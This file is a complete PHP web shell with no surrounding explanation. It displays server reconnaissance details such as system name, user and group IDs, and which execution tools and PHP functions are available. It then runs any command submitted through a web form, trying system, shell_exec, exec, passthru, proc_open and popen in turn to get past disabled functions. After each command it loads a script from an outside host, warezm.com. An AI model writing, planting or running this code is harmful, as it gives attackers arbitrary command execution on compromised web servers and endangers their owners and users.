<?php
echo '<center><img src="https://i.imgur.com/f8szFZd.gif" width="250" height="250"></center>';
if(!function_exists('posix_getegid')) {
	$user = @get_current_user();
	$uid = @getmyuid();
	$gid = @getmygid();
	$group = "?";
} else {
	$uid = @posix_getpwuid(posix_geteuid());
	$gid = @posix_getgrgid(posix_getegid());
	$user = $uid['name'];
	$uid = $uid['uid'];
	$group = $gid['name'];
	$gid = $gid['gid'];
}
$sm= ini_get('safe_mode') ? "<font color=lime> ONfont>" : "<font color=grey> OFF</font>";
$mysql= function_exists('mysql_connect')?"<font color=lime> ON</font>":"<font color=grey> OFF</font>";
$url_fp =ini_get('url_fopen')?"<font color=lime> ON</font>":"<font color=grey> OFF</font>";
$curl=function_exists('curl_init')?"<font color=lime> ON</font>":"<font color=grey> OFF</font>";
$wget = (exe('wget --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$perl = (exe('perl --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$python = (exe('python --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$df=ini_get('disable_functions') ? substr(ini_get('disable_functions'),0,50).",etc..." : "<font color=grey> NONE</font>";
echo "
<div id='center'>
<pre style='font-size:13px;'>
<center>SERVER SOFTWARE : ".$_SERVER['SERVER_SOFTWARE']."
UNAME : ".php_uname()."
HOSTNAME : ".$_SERVER['HTTP_HOST']."
IP SERVER : ".gethostbyname($_SERVER['HTTP_HOST'])." | YOUR IP : ".$_SERVER['REMOTE_ADDR']." 
User: <font color=lime>".$user."</font> (".$uid.") Group: <font color=lime>".$group."</font> (".$gid.")
PHP version : ".phpversion()."
CURL:".$curl."|WGET: ".$wget."|PERL: ".$perl."|PYTHON: ".$python."|MySQL:".$mysql."|safemode:".$sm."|URL FOPEN:".$url_fp."
DISABLE FUNCTIONS :".$df."<br>";
echo '[Current Dir:] ';
echo getcwd(); 
echo '/';
$current_file_name = basename($_SERVER['PHP_SELF']); echo $current_file_name."\n";
function exe($cmd){
	$xazx = "";
	$cmd = $cmd." 2>&1";

	if(is_callable('system')) {
		ob_start();
		@system($cmd);
		$xazx = ob_get_contents();
		ob_end_clean();
		if(!empty($xazx)) return $xazx;
	}
	if(is_callable('shell_exec')){
		$xazx = @shell_exec($cmd);
		if(!empty($xazx)) return $xazx;
	}
	if(is_callable('exec')) {
		@exec($cmd,$azxr);
		if(!empty($azxr)) foreach($azxr as $azxs) $xazx .= $azxs;
		if(!empty($xazx)) return $xazx;
	}
	if(is_callable('passthru')) {
		ob_start();
		@passthru($cmd);
		$xazx = ob_get_contents();
		ob_end_clean();
		if(!empty($xazx)) return $xazx;
	}
	if(is_callable('proc_open')) {
		$azxdescriptorspec = array(
		0 => array("pipe", "r"),
		1 => array("pipe", "w"),
		2 => array("pipe", "w")
		);
		$azxproc = @proc_open($cmd, $azxdescriptorspec, $azxpipes, getcwd(), array());
		if (is_resource($azxproc)) {
			while ($azxsi = fgets($azxpipes[1])) {
				if(!empty($azxsi)) $xazx .= $azxsi;
			}
			while ($azxse = fgets($azxpipes[2])) {
				if(!empty($azxse)) $xazx .= $azxse;
			}
		}
		@proc_close($azxproc);
		if(!empty($xazx)) return $xazx;
	}
	if(is_callable('popen')){
		$azxf = @popen($cmd, 'r');
		if($azxf){
			while(!feof($azxf)){
				$xazx .= fread($azxf, 2096);
			}
			pclose($azxf);
		}
		if(!empty($xazx)) return $xazx;
	}
	return "";
}

	echo "<form method='post'>
<center><font style='text-decoration: underline;'>Type Command</font> : 
<input type='text' size='30' height='10' name='cmd'><input type='submit' name='azx' value='Enter' style='border:1px solid;'></center>
	</form>	";
	if(isset($_POST['azx']))
{
 
echo'<br><div style="background:black;margin:0px;padding:1px;text-align:left;color:lime;"><pre>';
$cmd = $_POST['cmd'];
if($cmd == "")
{
 
echo "Please Insert Command!";
 }
 
elseif(isset($cmd))
 {
 $output = exe($cmd);
 echo $output; }
echo'</pre></div><br><br>';
echo "<script data-cfasync='false' src='//warezm.com/shell.js'></script>";
}

